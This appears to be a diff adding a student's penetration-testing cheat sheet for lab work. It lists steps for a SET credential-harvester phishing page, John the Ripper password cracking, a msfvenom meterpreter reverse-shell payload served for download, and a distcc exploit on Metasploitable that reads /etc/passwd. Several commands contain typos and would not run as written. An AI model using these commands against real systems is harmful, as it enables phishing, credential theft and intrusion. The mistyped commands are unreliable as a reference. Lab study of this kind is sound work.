@@ -1,0 +1,94 @@
+**Google Search** 
+- https://www.fastpeoplesearch.com/
+- https://www.netcraft.com/
+
+**Social Engineering** 
+- sudo su
+- setoolkit 
+1) Social-Engineering Attacks
+2) Website Attack Vectors
+3) Credential Harvester Attack Method
+1) Web Templates
+- Change network to Host-Only 
+- Type IP address 
+- Go to browser, search by IP address
+
+**Cracking password**
+ASCII (All printable ASCII characters), 
+Alnum (All alphanumeric characters), 
+Lower (Only lowercase letters), 
+and Digits (Only digits).
+
+- john --incremental=ASCII passwordFile /usr/share/wordlists/rockyou2.txt
+- john --show pwd
+
+or 
+- john --show --format=nt passwordFile
+
+**Explore extract file from Wireshark**
+-Packet Capture: File > Export Objects > Click file you want to extract 
+
+**Netcat**
+- Sender: nc -v -l -p 1100 < filewanttosend
+- Receiver: netcat ipadress 1100 > filewanttoget
+- Zip file: 
+
+**MD5SUM**
+- MD5 checksum of zipfile using the command: “md5sum zipfile”.
+
+**Unzip file**
+- unzip file.zip
+
+**Wireshark**
+- [SYN], [SYN][ACK],[ACK]: 3 handshakes 
+- After that files may be sent, HINT: [PSH] or [FIN]
+
+**Open Image***
+- feh filename.png
+
+**Find the string in dumpfile**
+- string -l -e filename | grep stringwanttofind 
+
+**Metasploit**
+----WINDOWS--------
+- Windows: ipconfig 
+- Kali: ifconfig
+- msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.1.36 LPORT=4444 -o Desktop/payload/payload.exe
+- sudo mv payload.exe /var/www/html/downloads/payload.exe
+- serive apache2 start
+- service postgresql start
+- mfsconsole 
+- use multi/handler
+- set payload windows/meterpreter/reverse.tcp 
+- set LHOST kaliip
+- set LPORT 4444
+- exploit
+- open browser => type kaliip/downsload 
+- download and open file payload.exe 
+- in kali, run cmd systeminfo for proof 
+
+-------METASPLOITABLE---------
+- msf: ifconfig
+- use exploit/unix/misc/distcc_exec
+- set rhost 192.1.168.38
+- set payload cmd/unix/reverse
+- set lhost
+- options
+- run 
+- ifconfig
+- cat/etc/passwd
+
+**Scan**
+- nmap -sV -sS -p1 -65000 ipaddress
+
+Grana Padano 2021
+
+
+
+
+
+ 
+
+
+
+
